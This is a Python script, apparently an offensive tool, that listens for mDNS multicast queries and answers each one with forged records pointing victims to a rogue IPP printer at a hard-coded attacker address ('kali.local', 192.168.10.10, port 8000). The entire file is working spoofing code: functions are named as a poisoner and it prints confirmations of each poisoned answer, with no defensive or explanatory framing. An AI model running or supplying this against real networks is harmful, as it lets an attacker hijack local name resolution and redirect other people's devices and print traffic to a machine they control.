#!/usr/bin/env python
import time, os, sys, struct, socket
from socketserver import UDPServer, ThreadingMixIn
from socketserver import BaseRequestHandler
from threading import Thread
from dnslib import *

MADDR = ('224.0.0.251', 5353)
class UDP_server(ThreadingMixIn, UDPServer):
    allow_reuse_address = True
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        mreq = struct.pack("=4sl", socket.inet_aton(MADDR[0]), socket.INADDR_ANY)
        self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        UDPServer.server_bind(self)

def MDNS_poisoner(host, port, handler):
    try:
        server = UDP_server((host, port), handler)
        server.serve_forever()
    except Exception as e:
        print(f"Error starting server on UDP port {port}:", e)

class MDNS(BaseRequestHandler):
    def handle(self):
        target_service = ''
        data, soc = self.request
        d = DNSRecord.parse(data)

        # basic error checking  - does the mDNS packet have at least 1 question?
        if d.header.q < 1:
            return

        # we are assuming that the first question contains the service name we want to spoof
        target_service = d.questions[0]._qname

        # now create the mDNS reply that will contain the service name and our IP address
        d = DNSRecord(DNSHeader(qr=1, id=0, bitmap=33792))
        d.add_answer(RR(target_service, QTYPE.SRV, ttl=120, rclass=32769, rdata=SRV(priority=0, target='kali.local', weight=0, port=8000)))
        d.add_answer(RR('kali.local', QTYPE.A, ttl=120, rclass=32769, rdata=A("192.168.10.10")))
        d.add_answer(RR('test._ipps._tcp.local', QTYPE.TXT, ttl=4500, rclass=32769, 
                        rdata=TXT([
                            "rp=ipp/print", "ty= Test Printer", "adminurl=https://kali:8000/ipp/print", 
                            "pdl=application/pdf,image/jpeg,image/pwg-raster", "product=(Printer)", 
                            "Color=F", "Duplex=F", "usb_MFG=Test", "usb_MDL=Printer", "UUID=0544e1d1-bba0-3cdf-5ebf-1bd9f600e0fe",
                            "TLS=1.2", "txtvers=1", "qtotal=1"])))
        soc.sendto(d.pack(), MADDR)
        print(f"Poisoned answer sent to {self.client_address[0]} for name {target_service}")
                        
def main():
    try:
        server_thread = Thread(target=MDNS_poisoner, args=('', 5353, MDNS,))
        server_thread.daemon = True
        server_thread.start()

        print("Listening for mDNS multicast traffic")
        while True:
            time.sleep(0.1)

    except KeyboardInterrupt:
        sys.exit("\rExiting...")

if __name__ == "__main__":
    main()
